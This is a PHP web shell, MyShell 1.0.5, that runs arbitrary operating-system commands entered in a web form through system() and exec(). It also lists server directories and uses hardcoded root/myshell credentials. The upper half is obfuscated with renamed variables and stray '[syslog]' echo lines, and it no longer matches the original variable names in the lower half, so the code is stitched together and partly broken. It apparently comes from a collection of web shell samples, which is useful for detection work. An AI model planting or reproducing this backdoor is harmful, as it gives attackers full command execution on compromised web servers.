<?php
echo '[syslog]01
'; $sp6b6a21 = 1; $sp0dae83 = 'root'; $sp1cfcce = 'myshell'; $sp9d1845 = 'youremail@yourserver.com'; $sp78e779 = $spf69472['SERVER_ADMIN']; $spa05801 = ''; $sp1afae3 = 1; $spe91b99 = 80; $sp0b856d = 20; $sp3a4d02 = '#000000'; $sp4adea9 = '#333333'; $sp434834 = '#00BB00'; $sp84f0dc = '#009900'; $spc9c044 = '#00FF00'; $sp8c57fa = 'MyShell 1.0.5 build 20010910'; if ($sp6b6a21) { if ($spc85c57 != $sp0dae83 || $spe0c6fa != $sp1cfcce) { echo '[syslog]02
'; echo "<html>\r\n         <head>\r\n         <title>MyShell error - Access Denied</title>\r\n         </head>\r\n         <h1>Access denied</h1>\r\n         A warning message have been sended to the administrator\r\n         <hr>\r\n         <em>{$sp8c57fa}</em>"; if (isset($spc85c57)) { $spd3a3d1 = "\r\n This is {$sp8c57fa}\r\n installed on: http://" . $spf69472['HTTP_HOST'] . "{$sp0c3ced}\r\n just to let you know that somebody tryed to access\r\n the script using wrong username or password:\r\n \r\n Date: " . date('Y-m-d H:i:s') . '
 IP: ' . $spf69472['REMOTE_ADDR'] . '
 User Agent: ' . $spf69472['HTTP_USER_AGENT'] . "\r\n username used: {$spc85c57}\r\n password used: {$spe0c6fa}\r\n \r\n If this is not the first time it happens,\r\n please consider either to remove MyShell\r\n from your system or change it's name or\r\n directory location on your server.\r\n \r\n Regards\r\n The MyShell dev team\r\n       "; mail($sp9d1845, 'MyShell Warning - Unauthorized Access', $spd3a3d1, "From: {$sp78e779}\nX-Mailer:{$sp8c57fa} AutoWarn System"); } die; } } echo '[syslog]03
'; if (!$spa5c24d) { $spa5c24d = $spe91b99; } if (!$sp29d555) { $sp29d555 = $sp0b856d; } ?>
<html>
<head>
<title>MyShell</title>
<style>
body{
	background-color: <?echo $bgColor ?>;
	font-family : sans-serif;
	font-size : 10px;
	scrollbar-face-color: #666666;
	scrollbar-shadow-color:  <?echo $bgColor ?>;
	scrollbar-highlight-color: #999999;
	scrollbar-3dlight-color:  <?echo $bgColor ?>;
	scrollbar-darkshadow-color:  <?echo $bgColor ?>;
	scrollbar-track-color:  <?echo $bgInputColor ?>;
	scrollbar-arrow-color:  <?echo $textColor ?>;
}
input,select,option{
	background-color: <?echo $bgInputColor ?>;
	color : <?echo $outColor ?>;
	border-style : none;
	font-size : 10px;
}
textarea{
	background-color: <?echo $bgColor ?>;
	color : <?echo $outColor ?>;
	border-style : none;
}
</style>
</head>
<body bgcolor=<?echo $bgColor ?> TEXT=<?echo $textColor ?> LINK=<?echo $linkColor ?> VLINK=<?echo $linkColor ?> onload=document.shell.command.select()>
<?php  if (isset($spd0603d)) { $spd0603d = validate_dir($spd0603d); @chdir($spd0603d) or $spbc3d3f = "Can't change directory. Permission denied\nSwitching back to {$spfe762a}\n"; $spd0603d = exec('pwd'); } else { $spd0603d = validate_dir($spfe762a); chdir($spd0603d); $spd0603d = exec('pwd'); } $sp82b83d = strpos($spfe16e8, 'cd '); if ((string) $sp82b83d != '') { $sp82b83d = $sp82b83d + 3; $sp49de29 = substr($spfe16e8, $sp82b83d); if ($sp49de29 == '..') { $spd0603d = strrev(substr(strstr(strrev($spd0603d), '/'), 1)); if ($spd0603d == '') { $spd0603d = '/'; } } elseif (substr($sp49de29, 0, 1) == '/') { $spd0603d = $sp49de29; } else { $spd0603d = $spd0603d . '/' . $sp49de29; } $spd0603d = validate_dir($spd0603d); @chdir($spd0603d) or $spbc3d3f = 'Can\'t change directory. Directory does not exist or permission denied'; $spd0603d = exec('pwd'); $sp120025 = $spfe16e8; $spfe16e8 = ''; } ?>

<form name="shell" method="post">
Current working directory: <b>
<?
$work_dir_splitted = explode("/", substr($work_dir, 1));
echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "/&command=" . urlencode($command) . "\">Root</a>/";
if ($work_dir_splitted[0] == "") {
  $work_dir = "/";  /* Root directory. */
}
else{
  for ($i = 0; $i < count($work_dir_splitted); $i++) {
    /*  echo "i = $i";*/
    $url .= "/".$work_dir_splitted[$i];
    echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "&command=" . urlencode($command) . "\">$work_dir_splitted[$i]</a>/";
  }
}
?>
</b>
<br>
<textarea cols="<? echo $oCols ?>" rows="<? echo $oRows ?>" readonly>
<?
echo "[syslog]04\n";
echo $dirError;
if ($command) {
  if ($stderr) {
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
  elseif (substr($command,0,3) == "man"){
      exec($command,$man);
      $rows=count($man);
      $codes = ".".chr(8);
      $manual = "";
      for ($i=0;$i<$rows;$i++){
          $manual.=$man[$i]."\n";
      }
      echo ereg_replace($codes,"",$manual);
  }
  else {
    $ok = system($command,$status);
    if($ok==false &&$status && $autoErrorTrap)system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
}
if ($commandBk) $command = $commandBk;
?>
</textarea>
<br>
<br>
Command:
<input type="text" name="command" size="80" <? if ($command && $echoCommand) { echo "value=\"$command\"";} ?> > <input name="submit_btn" type="submit" value="Go!">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<?
if ($autoErrorTrap) echo "Auto error traping enabled";
else echo "<input type=\"checkbox\" name=\"stderr\">stderr-traping ";
?>
<br>Working directory:
<select name="work_dir" onChange="this.form.submit()">
<?
echo "[syslog]06\n";
/* Now we make a list of the directories. */
$dir_handle = opendir($work_dir);
/* Run through all the files and directories to find the dirs. */
while ($dir = readdir($dir_handle)) {
  if (is_dir($dir)) {
    if ($dir == ".") {
      echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
    } elseif ($dir == "..") {
      /* We have found the parent dir. We must be carefull if the parent
         directory is the root directory (/). */
      if (strlen($work_dir) == 1) {
        /* work_dir is only 1 charecter - it can only be / */
      } elseif (strrpos($work_dir, "/") == 0) {
        /* The last / in work_dir were the first charecter.
           This means that we have a top-level directory
           eg. /bin or /home etc... */
      echo "<option value=\"/\">Parent Directory</option>\n";
      } else {
      /* We do a little bit of string-manipulation to find the parent
         directory... Trust me - it works :-) */
      echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
      }
    } else {
      if ($work_dir == "/") {
        echo "<option value=\"$work_dir$dir\">$dir</option>\n";
      } else {
        echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
      }
    }
  }
}
  closedir($dir_handle);
?>
</select>
&nbsp; | &nbsp;<input type="checkbox" name="echoCommand"<?if($echoCommand)echo " checked"?>>Echo commands
&nbsp; | &nbsp;Cols:<input type="text" name="oCols" size=3 value=<?echo $oCols?>>
&nbsp;Rows:<input type="text" name="oRows" size=2 value=<?echo $oRows?>>
&nbsp;| ::::::::::&nbsp;<a href="http://www.digitart.net" target="_blank" style="text-decoration:none"><b>MyShell</b> &copy;2001 Digitart Producciones</a>
</form>
</body>
</html>
<?
function validate_dir($dir){
    GLOBAL $dirLimit;
    if($dirLimit){
        $cdPos = strpos($dir,$dirLimit);
        if ((string)$cdPos == "") {
            $dir = $dirLimit;
            $GLOBALS["dirError"] = "You are not allowed change to directories above $dirLimit\n";
        }
    }
    return $dir;
}
echo "[syslog]06\n";
?>
<?php 